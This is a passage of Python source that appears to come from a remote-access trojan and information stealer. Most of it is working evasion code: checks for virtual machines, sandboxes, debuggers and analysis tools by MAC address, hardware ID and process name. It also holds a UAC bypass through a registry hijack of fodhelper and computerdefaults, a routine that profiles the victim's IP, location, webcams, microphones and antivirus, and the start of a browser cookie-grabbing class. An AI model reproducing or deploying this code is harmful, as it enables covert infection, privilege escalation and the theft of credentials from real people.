    'r': 'rŕŗɾṛṙ',
    's': 'sşșṣꜱṡ',
    't': 'tţțȶʈṭ',
    'u': 'uưυụủύ',
    'v': 'vᶌṽṿⱱ',
    'w': 'wŵԝẇẉⱳ',
    'x': 'xᶍẋẍ',
    'y': 'yƴẏỳỵỿ',
    'z': 'zȥᶎẓẕⱬ',
    'A': 'AÀÁĄȂȦ',
    'B': 'BΒВẞƁḄ',
    'C': 'CÇĆĈĊƇ',
    'D': 'DĎĐƊḊḌ',
    'E': 'EȨΈἛῈΈ',
    'F': 'FFƑḞ',
    'G': 'GĜĠĢƓǤ',
    'H': 'HḢḤḨⱧꜦ',
    'I': 'IĮΙἺἻἼ',
    'J': 'JĴɈЈ',
    'K': 'KƘΚКҜҞ',
    'L': 'LĹĻĽⱢꝈ',
    'M': 'MΜḾṀṂⱮ',
    'N': 'NŃŅƝΝṆ',
    'O': 'OΌΟОΌῸ',
    'P': 'PƤṖṔꝐꝒ',
    'Q': 'QԚꝖǪǬ',
    'R': 'RŔŖɌṘⱤ',
    'S': 'SŞȘṠṢṨ',
    'T': 'TŢƬΤҬṪ',
    'U': 'UÙÚŲƯỦ',
    'V': 'VṼṾ',
    'W': 'WŴԜẆẈⱲ',
    'X': 'XẊẌ',
    'Y': 'YŸƳẎỲỴ',
    'Z': 'ZŻȤΖẒⱫ',
}

channel_names = {
    'first_parts': ['Happy', 'Joyful', 'Amazing', 'Mighty', 'Curious', 'Playful', 'Silly', 'Crazy', 'Sneaky', 'Wise', 'Clever', 'Smart', 'Brave', 'Bold', 'Strong', 'Powerful'],
    'second_parts': ['Cat', 'Giraffe', 'Hippo', 'Chihuahua', 'Penguin', 'Panda', 'Koala', 'Kangaroo', 'Elephant', 'Lion', 'Tiger', 'Bear', 'Wolf', 'Fox', 'Raccoon', 'Squirrel', 'Rabbit', 'Hedgehog', 'Owl', 'Eagle', 'Falcon', 'Hawk', 'Parrot', 'Duck', 'Goose', 'Swan', 'Pigeon', 'Sparrow']
}

def render_text(text, result=''):
    for char in text:
        if char in table: result += random.choice(table[char])
        else: result += char
    return result

def generate_channel_name():
    return f'{random.choice(channel_names["first_parts"])}{random.choice(channel_names["second_parts"])}'

def protection_check():
    try:
        requests.get("https://google.com")
    except requests.ConnectionError:
        return True
    
    scarecrow_hash = "83ea1c039f031aa2b05a082c63df12398e6db1322219c53ac4447c637c940dae"
    def check_scarecrow():
        scarecrow_paths = [
            "\\ProgramData\\ScareCrow",
            "\\Users\\Public\\ScareCrow",
            "\\Program Files\\Cyber Scarecrow"
        ]
        scarecrow_files = [
            "scarecrow.exe",
            "scarecrow.dll",
            "scarecrow.json",
            "scarecrow_payload.bin",
            "scarecrow_tray.exe",
            "scarecrow_core.exe",
            "scarecrow_process.exe"
        ]

        for path in scarecrow_paths:
            if os.path.exists(os.getenv('SystemDrive') + path):
                return True

        for root, dirs, files in os.walk(os.getenv('SystemDrive') + "\\"):
            for file in files:
                if file.lower() in scarecrow_files:
                    return True

        reg_keys = [
            r"HKLM\SOFTWARE\ScareCrow",
            r"HKCU\SOFTWARE\ScareCrow",
            r"HKLM\SOFTWARE\Scarecrow"
        ]
        reg_keys_exist = False
        for key in reg_keys:
            try:
                subprocess.check_output(f'reg query {key}', creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
                reg_keys_exist = True
                break
            except subprocess.CalledProcessError:
                continue
        
        if reg_keys_exist:
            return True
        else:
            return False

    def detect_cursor_sync(threshold=5):
        movements = []

        start_time = time.time()
        while time.time() - start_time < 5:
            x, y = pyautogui.position()
            movements.append((x, y))
            time.sleep(0.01)

        movements = np.array(movements)

        diffs = np.diff(movements, axis=0)
        diffs_magnitude = np.linalg.norm(diffs, axis=1)

        if np.any(diffs_magnitude < threshold):
            return True
        else: 
            return False

    def rdtsc():
        class LARGE_INTEGER(ctypes.Structure):
            _fields_ = [("LowPart", ctypes.c_uint32),
                        ("HighPart", ctypes.c_uint32)]

        class RDTSC(ctypes.Union):
            _fields_ = [("u", LARGE_INTEGER),
                        ("QuadPart", ctypes.c_uint64)]

        rdtsc_value = RDTSC()
        ctypes.windll.kernel32.QueryPerformanceCounter(ctypes.byref(rdtsc_value))
        return rdtsc_value.QuadPart

    def collect_rdtsc_data(duration=10):
        timings = []
        start_time = time.time()
        while time.time() - start_time < duration:
            start = rdtsc()
            time.sleep(0.1)
            end = rdtsc()
            timings.append(end - start)
        return timings

    def analyze_rdtsc_data(timings):
        mean_timing = np.mean(timings)
        stddev_timing = np.std(timings)
        return mean_timing, stddev_timing

    def detect_rdtsc_spoofing():
        timings = collect_rdtsc_data()
        mean_timing, stddev_timing = analyze_rdtsc_data(timings)
        threshold = 1200000
        if mean_timing < threshold or stddev_timing > (threshold * 0.1):
            return True
        return False

    def detect_hypervisors():
        hypervisor_files = [
            "\\windows\\system32\\drivers\\VBoxGuest.sys",
            "\\windows\\system32\\drivers\\VBoxSF.sys",
            "\\windows\\system32\\drivers\\VBoxVideo.sys",
            "\\windows\\system32\\drivers\\vm3dmp.sys",
            "\\windows\\system32\\drivers\\vmhgfs.sys",
            "\\windows\\system32\\drivers\\vmusbmouse.sys"
        ]
        for file in hypervisor_files:
            if os.path.exists(os.getenv('SystemDrive') + file):
                return True
        return False

    def is_vm():
        vm_files = [
            "\\windows\\system32\\vmGuestLib.dll",
            "\\windows\\system32\\vm3dgl.dll",
            "\\windows\\system32\\vboxhook.dll",
            "\\windows\\system32\\vboxmrxnp.dll",
            "\\windows\\system32\\vmsrvc.dll",
            "\\windows\\system32\\drivers\\vmsrvc.sys"
        ]
        vm_processes = [
            'vmtoolsd.exe', 
            'vmwaretray.exe', 
            'vmwareuser.exe',
            'vboxservice.exe', 
            'vboxtray.exe', 
            'vmwaretray.exe', 
            'prl_cc.exe', 
            'prl_tools.exe', 
            'xenservice.exe', 
            'qemu-ga.exe', 
            'joeboxserver.exe'
        ]

        try:
            bioscheck = subprocess.check_output("wmic bios get smbiosbiosversion", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
            if "Hyper-V" in str(bioscheck): 
                return True
        except: pass

        for file_path in vm_files:
            if os.path.exists(os.getenv('SystemDrive') + file_path):
                return True

        for process in psutil.process_iter(['pid', 'name']):
            if process.info['name'].lower() in vm_processes:
                with open(process.exe(), "rb") as file:
                    hash_ = hashlib.sha256(file.read()).hexdigest()

                    if hash_ == scarecrow_hash:
                        return False
                return True

        #if detect_cursor_sync():
        #    return True
        #if detect_rdtsc_spoofing():
        #    return True
        if detect_hypervisors():
            return True

        return False
    
    blacklisted_processes = [
        'fakenet.exe', 
        'dumpcap.exe', 
        'httpdebuggerui.exe', 
        'wireshark.exe', 
        'fiddler.exe', 
        'ida64.exe', 
        'ollydbg.exe', 
        'pestudio.exe', 
        'x96dbg.exe', 
        'x32dbg.exe', 
        'ksdumperclient.exe', 
        'ksdumper.exe'
    ]
    blacklisted_hwids = [
        "7AB5C494-39F5-4941-9163-47F54D6D5016",
        "03DE0294-0480-05DE-1A06-350700080009",
        "11111111-2222-3333-4444-555555555555",
        "6F3CA5EC-BEC9-4A4D-8274-11168F640058",
        "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548",
        "4C4C4544-0050-3710-8058-CAC04F59344A",
        "00000000-0000-0000-0000-AC1F6BD04972",
        "00000000-0000-0000-0000-000000000000",
        "5BD24D56-789F-8468-7CDC-CAA7222CC121",
        "49434D53-0200-9065-2500-65902500E439",
        "49434D53-0200-9036-2500-36902500F022",
        "777D84B3-88D1-451C-93E4-D235177420A7",
        "49434D53-0200-9036-2500-369025000C65",
        "B1112042-52E8-E25B-3655-6A4F54155DBF",
        "00000000-0000-0000-0000-AC1F6BD048FE",
        "EB16924B-FB6D-4FA1-8666-17B91F62FB37",
        "A15A930C-8251-9645-AF63-E45AD728C20C",
        "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3",
        "C7D23342-A5D4-68A1-59AC-CF40F735B363",
        "63203342-0EB0-AA1A-4DF5-3FB37DBB0670",
        "44B94D56-65AB-DC02-86A0-98143A7423BF",
        "6608003F-ECE4-494E-B07E-1C4615D1D93C",
        "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
        "49434D53-0200-9036-2500-369025003AF0",
        "8B4E8278-525C-7343-B825-280AEBCD3BCB",
        "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",
        "79AF5279-16CF-4094-9758-F88A616D81B4",
        "FF577B79-782E-0A4D-8568-B35A9B7EB76B",
        "08C1E400-3C56-11EA-8000-3CECEF43FEDE",
        "6ECEAF72-3548-476C-BD8D-73134A9182C8",
        "49434D53-0200-9036-2500-369025003865",
        "119602E8-92F9-BD4B-8979-DA682276D385",
        "12204D56-28C0-AB03-51B7-44A8B7525250",
        "63FA3342-31C7-4E8E-8089-DAFF6CE5E967",
        "365B4000-3B25-11EA-8000-3CECEF44010C",
        "D8C30328-1B06-4611-8E3C-E433F4F9794E",
        "00000000-0000-0000-0000-50E5493391EF",
        "00000000-0000-0000-0000-AC1F6BD04D98",
        "4CB82042-BA8F-1748-C941-363C391CA7F3",
        "B6464A2B-92C7-4B95-A2D0-E5410081B812",
        "BB233342-2E01-718F-D4A1-E7F69D026428",
        "9921DE3A-5C1A-DF11-9078-563412000026",
        "CC5B3F62-2A04-4D2E-A46C-AA41B7050712",
        "00000000-0000-0000-0000-AC1F6BD04986",
        "C249957A-AA08-4B21-933F-9271BEC63C85",
        "BE784D56-81F5-2C8D-9D4B-5AB56F05D86E",
        "ACA69200-3C4C-11EA-8000-3CECEF4401AA",
        "3F284CA4-8BDF-489B-A273-41B44D668F6D",
        "BB64E044-87BA-C847-BC0A-C797D1A16A50",
        "2E6FB594-9D55-4424-8E74-CE25A25E36B0",
        "42A82042-3F13-512F-5E3D-6BF4FFFD8518",
        "38AB3342-66B0-7175-0B23-F390B3728B78",
        "48941AE9-D52F-11DF-BBDA-503734826431",
        "A7721742-BE24-8A1C-B859-D7F8251A83D3",
        "3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E",
        "D2DC3342-396C-6737-A8F6-0C6673C1DE08",
        "EADD1742-4807-00A0-F92E-CCD933E9D8C1",
        "AF1B2042-4B90-0000-A4E4-632A1C8C7EB1",
        "FE455D1A-BE27-4BA4-96C8-967A6D3A9661",
        "921E2042-70D3-F9F1-8CBD-B398A21F89C6",
        "6AA13342-49AB-DC46-4F28-D7BDDCE6BE32",
        "F68B2042-E3A7-2ADA-ADBC-A6274307A317",
        "07AF2042-392C-229F-8491-455123CC85FB",
        "4EDF3342-E7A2-5776-4AE5-57531F471D56",
        "032E02B4-0499-05C3-0806-3C0700080009",
        "11111111-2222-3333-4444-555555555555"
    ]
    blacklisted_macs = [
        "05:17:5D:75:D5:54",
        "00:03:47:63:8b:de",
        "00:0c:29:05:d8:6e",
        "00:0c:29:2c:c1:21",
        "00:0c:29:52:52:50",
        "00:0d:3a:d2:4f:1f",
        "00:15:5d:00:00:1d",
        "00:15:5d:00:00:a4",
        "00:15:5d:00:00:b3",
        "00:15:5d:00:00:c3",
        "00:15:5d:00:00:f3",
        "00:15:5d:00:01:81",
        "00:15:5d:00:02:26",
        "00:15:5d:00:05:8d",
        "00:15:5d:00:05:d5",
        "00:15:5d:00:06:43",
        "00:15:5d:00:07:34",
        "00:15:5d:00:1a:b9",
        "00:15:5d:00:1c:9a",
        "00:15:5d:13:66:ca",
        "00:15:5d:13:6d:0c",
        "00:15:5d:1e:01:c8",
        "00:15:5d:23:4c:a3",
        "00:15:5d:23:4c:ad",
        "00:15:5d:b6:e0:cc",
        "00:1b:21:13:15:20",
        "00:1b:21:13:21:26",
        "00:1b:21:13:26:44",
        "00:1b:21:13:32:20",
        "00:1b:21:13:32:51",
        "00:1b:21:13:33:55",
        "00:23:cd:ff:94:f0",
        "00:25:90:36:65:0c",
        "00:25:90:36:65:38",
        "00:25:90:36:f0:3b",
        "00:25:90:65:39:e4",
        "00:50:56:97:a1:f8",
        "00:50:56:97:ec:f2",
        "00:50:56:97:f6:c8",
        "00:50:56:a0:06:8d",
        "00:50:56:a0:38:06",
        "00:50:56:a0:39:18",
        "00:50:56:a0:45:03",
        "00:50:56:a0:59:10",
        "00:50:56:a0:61:aa",
        "00:50:56:a0:6d:86",
        "00:50:56:a0:84:88",
        "00:50:56:a0:af:75",
        "00:50:56:a0:cd:a8",
        "00:50:56:a0:d0:fa",
        "00:50:56:a0:d7:38",
        "00:50:56:a0:dd:00",
        "00:50:56:ae:5d:ea",
        "00:50:56:ae:6f:54",
        "00:50:56:ae:b2:b0",
        "00:50:56:ae:e5:d5",
        "00:50:56:b3:05:b4",
        "00:50:56:b3:09:9e",
        "00:50:56:b3:14:59",
        "00:50:56:b3:21:29",
        "00:50:56:b3:38:68",
        "00:50:56:b3:38:88",
        "00:50:56:b3:3b:a6",
        "00:50:56:b3:42:33",
        "00:50:56:b3:4c:bf",
        "00:50:56:b3:50:de",
        "00:50:56:b3:91:c8",
        "00:50:56:b3:94:cb",
        "00:50:56:b3:9e:9e",
        "00:50:56:b3:a9:36",
        "00:50:56:b3:d0:a7",
        "00:50:56:b3:dd:03",
        "00:50:56:b3:ea:ee",
        "00:50:56:b3:ee:e1",
        "00:50:56:b3:f6:57",
        "00:50:56:b3:fa:23",
        "00:e0:4c:42:c7:cb",
        "00:e0:4c:44:76:54",
        "00:e0:4c:46:cf:01",
        "00:e0:4c:4b:4a:40",
        "00:e0:4c:56:42:97",
        "00:e0:4c:7b:7b:86",
        "00:e0:4c:94:1f:20",
        "00:e0:4c:b3:5a:2a",
        "00:e0:4c:b8:7a:58",
        "00:e0:4c:cb:62:08",
        "00:e0:4c:d6:86:77",
        "06:75:91:59:3e:02",
        "08:00:27:3a:28:73",
        "08:00:27:45:13:10",
        "12:1b:9e:3c:a6:2c",
        "12:8a:5c:2a:65:d1",
        "12:f8:87:ab:13:ec",
        "16:ef:22:04:af:76",
        "1a:6c:62:60:3b:f4",
        "1c:99:57:1c:ad:e4",
        "1e:6c:34:93:68:64",
        "2e:62:e8:47:14:49",
        "2e:b8:24:4d:f7:de",
        "32:11:4d:d0:4a:9e",
        "3c:ec:ef:43:fe:de",
        "3c:ec:ef:44:00:d0",
        "3c:ec:ef:44:01:0c",
        "3c:ec:ef:44:01:aa",
        "3e:1c:a1:40:b7:5f",
        "3e:53:81:b7:01:13",
        "3e:c1:fd:f1:bf:71",
        "42:01:0a:8a:00:22",
        "42:01:0a:8a:00:33",
        "42:01:0a:8e:00:22",
        "42:01:0a:96:00:22",
        "42:01:0a:96:00:33",
        "42:85:07:f4:83:d0",
        "4e:79:c0:d9:af:c3",
        "4e:81:81:8e:22:4e",
        "52:54:00:3b:78:24",
        "52:54:00:8b:a6:08",
        "52:54:00:a0:41:92",
        "52:54:00:ab:de:59",
        "52:54:00:b3:e4:71",
        "56:b0:6f:ca:0a:e7",
        "56:e8:92:2e:76:0d",
        "5a:e2:a6:a4:44:db",
        "5e:86:e4:3d:0d:f6",
        "60:02:92:3d:f1:69",
        "60:02:92:66:10:79",
        "7e:05:a3:62:9c:4d",
        "90:48:9a:9d:d5:24",
        "92:4c:a8:23:fc:2e",
        "94:de:80:de:1a:35",
        "96:2b:e9:43:96:76",
        "a6:24:aa:ae:e6:12",
        "ac:1f:6b:d0:48:fe",
        "ac:1f:6b:d0:49:86",
        "ac:1f:6b:d0:4d:98",
        "ac:1f:6b:d0:4d:e4",
        "b4:2e:99:c3:08:3c",
        "b4:a9:5a:b1:c6:fd",
        "b6:ed:9d:27:f4:fa",
        "be:00:e5:c5:0c:e5",
        "c2:ee:af:fd:29:21",
        "c8:9f:1d:b6:58:e4",
        "ca:4d:4b:ca:18:cc",
        "d4:81:d7:87:05:ab",
        "d4:81:d7:ed:25:54",
        "d6:03:e4:ab:77:8e",
        "ea:02:75:3c:90:9f",
        "ea:f6:f1:a2:33:76",
        "f6:a5:41:31:b2:78",
        ]
    blacklisted_hostnames = [
        "AppOnFly-VPS",
        "vboxuser",
        "ARCHIBALDPC",
        "6C4E733F-C2D9-4"
    ]
    blacklisted_usernames = [
        "WDAGUtilityAccount",
        "vboxuser"
    ]

    try:
        my_mac = str(getmac.get_mac_address())
        if my_mac in blacklisted_macs:
            return True
    except: pass

    try:
        my_hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()
        if my_hwid in blacklisted_hwids:
            return True
    except: pass

    try:
        hostname = socket.gethostname()
        if hostname in blacklisted_hostnames:
            return True
    except: pass

    try:
        username = os.getlogin()
        if username in blacklisted_usernames:
            return True
    except: pass

    try: 
        speedcheck = subprocess.check_output('wmic MemoryChip get /format:list | find /i "Speed"', creationflags=subprocess.CREATE_NO_WINDOW, shell=True).decode().strip()
        if "Speed=0" in str(speedcheck):
            return True
    except: pass

    for process in psutil.process_iter(['pid', 'name']):
        if process.info['name'].lower() in blacklisted_processes:
            with open(process.exe(), "rb") as file:
                    hash_ = hashlib.sha256(file.read()).hexdigest()

                    if hash_ == scarecrow_hash:
                        return False
            return True

    if check_scarecrow():
        return False

    if is_vm():
        return True

    return False

def single_instance_lock():
    web_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        web_socket.bind(('localhost', 12344))
    except socket.error: # on error socket is occupied -> another instance is running
        return True

    return False


def UACbypass(method: int = 1) -> bool:
    if GetSelf()[1]:
        execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True)
        if method == 1:
            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
            execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("computerdefaults --nouacbypass")
            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
            if log_count_after > log_count_before:
                return UACbypass(method + 1)
        elif method == 2:
            execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
            execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
            log_count_before = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("fodhelper --nouacbypass")
            log_count_after = len(execute('wevtutil qe "Microsoft-Windows-Windows Defender/Operational" /f:text').stdout)
            execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
            if log_count_after > log_count_before:
                return UACbypass(method + 1)
        else:
            return False
        return True

def GetSelf() -> tuple[str, bool]:
    if hasattr(sys, "frozen"):
        return (sys.executable, True)
    else:
        return (__file__, False)

class grab_info:
    def __init__(self):
        self.prepare_info()

    def prepare_info(self):
        info = self.get_info()
        return f'''
> **»** Started at:  **<t:{info['start_time']}:f>**
> **»** {render_text('Elevated')} permissions:  **`{info['is_admin']}`**
> **»** {render_text('IP')}:  **`{info['ip']}`**
> **»** Country:  **`{info['country']}`**
> **»** City:  **`{info['city']}`**
> **»** Latitude:  **`{info['latitude']}`**
> **»** Longitude:  **`{info['longitude']}`**
> **»** {render_text('Hostname')}:  **`{info['host_name']}`**
> **»** OS:  **`Windows {info['release']}`**
> **»** {render_text('Microphones')}:  **`{info['microphones']}`**
> **»** {render_text('Webcams')}:  **`{info['webcams']}`**
> **»** Monitors:  **`{info['monitors']}`**
> **»** {render_text('Antivirus')}:  **`{', '.join(info['antivirus']) if isinstance(info['antivirus'], list) else info['antivirus']}`**
> **»** {render_text('CPU')}:  **`{info['cpu']}`**
> **»** {render_text('GPU')}:  **`{', '.join(info['gpu']) if isinstance(info['gpu'], list) else info['gpu']}`**
> **»** {render_text('RAM')}:  **`{info['ram']}`**
> **»** Install Date:  **`{info['install_date']}`**'''

    def get_ip_info(self, ip):
        try: return json.loads(requests.get(f'https://geolocation-db.com/jsonp/{ip}').content.decode().split("(")[1].strip(")"))
        except Exception: return {'country_name': 'Unknown', 'city': 'Unknown', 'latitude': 'Unknown', 'longitude': 'Unknown', 'state': 'Unknown'}

    def get_info(self):
        info = {}
        try:
            info['ip'] = urlopen('https://ipv4.lafibre.info/ip.php').read().decode('utf-8').strip()
            ip_info = self.get_ip_info(info['ip'])
            info['country'] = ip_info['country_name']
            info['city'] = ip_info['city']
            info['latitude'] = ip_info['latitude']
            info['longitude'] = ip_info['longitude']
            info['state'] = ip_info['state']
        except Exception:
            info['ip'] = 'Unknown'
            info['country'] = 'Unknown'
            info['city'] = 'Unknown'
            info['latitude'] = 'Unknown'
            info['longitude'] = 'Unknown'
            info['state'] = 'Unknown'
        try:
            uname = platform.uname()
            info['system'] = uname.system
            info['host_name'] = uname.node
            info['release'] = uname.release
            info['version'] = uname.version
            info['machine'] = uname.machine
            info['processor'] = uname.processor
        except Exception:
            info['system'] = 'Unknown'
            info['host_name'] = 'Unknown'
            info['release'] = 'Unknown'
            info['version'] = 'Unknown'
            info['machine'] = 'Unknown'
            info['processor'] = 'Unknown'
        
        try: info['is_admin'] = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception: info['is_admin'] = 'Unknown'
        
        try: info['start_time'] = str(datetime.timestamp(datetime.now())).split('.')[0]
        except Exception: info['start_time'] = 'Unknown'
        
        try: info['microphones'] = self.get_microphone_count()
        except Exception: info['microphones'] = 'Unknown'
        
        try:
            webcams = self.get_video_devices()
            info['webcams'] = len(webcams) if webcams != 'Unknown' else 'Unknown'
        except Exception: info['webcams'] = 'Unknown'
        
        try:
            monitors = get_monitors()
            info['monitors'] = len(monitors) if monitors != 'Unknown' else 'Unknown'
        except Exception: info['monitors'] = 'Unknown'
        
        try: info['cpu'] = self.get_cpu_info()
        except Exception: info['cpu'] = 'Unknown'
        
        try: info['gpu'] = self.get_gpu_info()
        except Exception: info['gpu'] = 'Unknown'
        
        try: info['ram'] = f"{round(psutil.virtual_memory().total / (1024.0 **3))} GB"
        except Exception: info['ram'] = 'Unknown'
        
        try: info['install_date'] = self.get_install_date()
        except Exception: info['install_date'] = 'Unknown'

        try: info['antivirus'] = pysilon_av_detect.check_running_antivirus()
        except Exception: info['antivirus'] = 'Unknown'
        
        return info

    def get_microphone_count(self):
        try:
            result = subprocess.check_output(
                'powershell "Get-PnpDevice -Class AudioEndpoint | Select-Object -Property FriendlyName"', 
                shell=True
            ).decode()
            devices = result.split("\n")[3:-1]
            microphones = set()
            for device in devices:
                device_name = device.strip()
                if 'Microphone' in device_name and 'High Definition Audio' not in device_name:
                    microphones.add(device_name)
            return len(microphones)
        except Exception: return 'Unknown'

    def get_video_devices(self):
        try:
            result = subprocess.check_output(
                'powershell "Get-WmiObject Win32_PnPEntity | Where-Object { $_.Service -eq \'usbvideo\' } | Select-Object -Property Name"', 
                shell=True
            ).decode()
            devices = result.split("\n")[3:-1]
            return [device.strip() for device in devices if device.strip()]
        except Exception: return 'Unknown'

    def get_monitors(self):
        try: return [str(monitor) for monitor in get_monitors()]
        except Exception: return 'Unknown'

    def get_cpu_info(self):
        try:
            result = subprocess.check_output('wmic cpu get name', shell=True).decode()
            cpu_info = result.split("\n")[1].strip()
            return cpu_info
        except Exception: return 'Unknown'

    def get_gpu_info(self):
        try:
            result = subprocess.check_output('wmic path win32_VideoController get name', shell=True).decode()
            devices = result.split("\n")[1:-1]
            return [device.strip() for device in devices if device.strip()]
        except Exception: return 'Unknown'

    def get_install_date(self):
        try:
            file_creation_time = os.path.getctime(__file__)
            install_date = datetime.fromtimestamp(file_creation_time).strftime('%Y-%m-%d %H:%M:%S')
            return install_date
        except Exception: return 'Unknown'

antiviruses = {
    'Norton360.exe': 'Norton',
    'NortonSecurity.exe': 'Norton',
    'NS.exe': 'Norton',
    'Malwarebytes.exe': 'Malwarebytes',
    'mbam.exe': 'Malwarebytes',
    'MBAMService.exe': 'Malwarebytes',
    'Antimalware Service Executable': 'Windows Defender',
    'MsMpEng.exe': 'Windows Defender',
    'avguard.exe': 'Avira',
    'avgnt.exe': 'Avira',
    'AvastSvc.exe': 'Avast',
    'AvastUI.exe': 'Avast',
    'Mcshield.exe': 'McAfee',
    'McTray.exe': 'McAfee',
    'mfevtps.exe': 'McAfee',
    'PccNTMon.exe': 'Trend Micro Antivirus',
    'TMBMSRV.exe': 'Trend Micro Antivirus',
    'TmProxy.exe': 'Trend Micro Antivirus',
    'cavwp.exe': 'Comodo Antivirus',
    'cmdagent.exe': 'Comodo Antivirus',
    'cis.exe': 'Comodo Antivirus',
    'ntrtscan.exe': 'Worry-Free',
    'tmlisten.exe': 'Worry-Free',
    'kavsvc.exe': 'Kaspersky',
    'avp.exe': 'Kaspersky',
    'avpui.exe': 'Kaspersky',
    'egui.exe': 'ESET NOD32',
    'ekrn.exe': 'ESET NOD32',
    'eguiProxy.exe': 'ESET NOD32',
    'cpd.exe': 'Check Point',
    'cpview.exe': 'Check Point',
    'fwm.exe': 'Check Point',
    'bdagent.exe': 'Bitdefender',
    'bdredline.exe': 'Bitdefender',
    'updatesrv.exe': 'Bitdefender',
    'fsav32.exe': 'FSecure',
    'fsma32.exe': 'FSecure',
    'fsorsp.exe': 'FSecure',
    'sfc.exe': 'Avira',
    'SDWSCSvc.exe': 'SpyBot',
    'SDTray.exe': 'SpyBot',
    'SDUpdSvc.exe': 'SpyBot',
    'AdAwareService.exe': 'Adaware',
    'AdAwareTray.exe': 'Adaware',
    'AdAware.exe': 'Adaware',
    'dwengine.exe': 'Dr.Web',
    'spideragent.exe': 'Dr.Web',
    'drweb32w.exe': 'Dr.Web',
    'CrowdStrike.exe': 'Falcon Prevent',
    'falcon-sensor.exe': 'Falcon Prevent',
    'falcon-ui.exe': 'Falcon Prevent',
    'defenseprosvc.exe': 'Radware',
    'radware.sys': 'Radware',
    'appwallctrl.exe': 'Radware',
    'AdguardSvc.exe': 'Adguard',
    'Adguard.exe': 'Adguard',
    'AdguardSvc.exe': 'Adguard',
    'a2guard.exe': 'Emsisoft',
    'a2service.exe': 'Emsisoft',
    'a2start.exe': 'Emsisoft',
    'QHSafeTray.exe': '360 Total Security',
    '360rp.exe': '360 Total Security',
    '360tray.exe': '360 Total Security',
    'Thor.exe': 'Thor',
    'ThorUpdate.exe': 'Thor',
    'ThorFw.exe': 'Thor',
    'MetaDefender.exe': 'Metadefender',
    'MetaScanner.exe': 'Metadefender',
    'metascan.exe': 'Metadefender',
    'avkproxy.exe': 'G Data Antivirus',
    'avk.exe': 'G Data Antivirus',
    'gdscan.exe': 'G Data Antivirus',
    'TotalAV.exe': 'TotalAV',
    'AVProtection.exe': 'TotalAV',
    'AVService.exe': 'TotalAV',
    'MWAV.exe': 'MicroWorld',
    'mwagent.exe': 'MicroWorld',
    'mwagentui.exe': 'MicroWorld',
    'SpyHunter5.exe': 'SpyHunter',
    'SpyHunterService.exe': 'SpyHunter',
    'SpyHunterTray.exe': 'SpyHunter',
    'HitmanPro.exe': 'HitmanPro',
    'HitmanPro.Alert.exe': 'HitmanPro',
    'HitmanProService.exe': 'HitmanPro',
    'ZAM.exe': 'Zemana',
    'ZAM_Guard.exe': 'Zemana',
    'ZAMController.exe': 'Zemana',
    'FExe.exe': 'Fortres',
    'FRW.exe': 'Fortres',
    'FRCP.exe': 'Fortres',
    'WRSA.exe': 'Webroot',
    'WRSAUI.exe': 'Webroot',
    'WRSA.exe': 'Webroot',
}

process_list = []
av_list = []
def check_running_antivirus():
    for process in process_iter(['name']):
        process_name = process.name()
        process_list.append(process_name)
        if process_name in antiviruses.keys():
            av_list.append(antiviruses[process_name])
    if len(av_list) == 0:
        av_list.append('Not detected')
    return av_list

def grab_cookies():
    browser = Browsers()
    browser.grab_cookies()

def create_temp(_dir: str or os.PathLike = None):
    if _dir is None:
        _dir = os.path.expanduser("~/tmp")
    if not os.path.exists(_dir):
        os.makedirs(_dir)
    file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
    path = os.path.join(_dir, file_name)
    open(path, "x").close()
    return path

class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browser_exe = ["chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe", "centbrowser.exe",
                            "7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe", "msedge.exe", "uran.exe", "yandex.exe", "iridium.exe"]
        self.browsers_found = []
        self.browsers = {
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

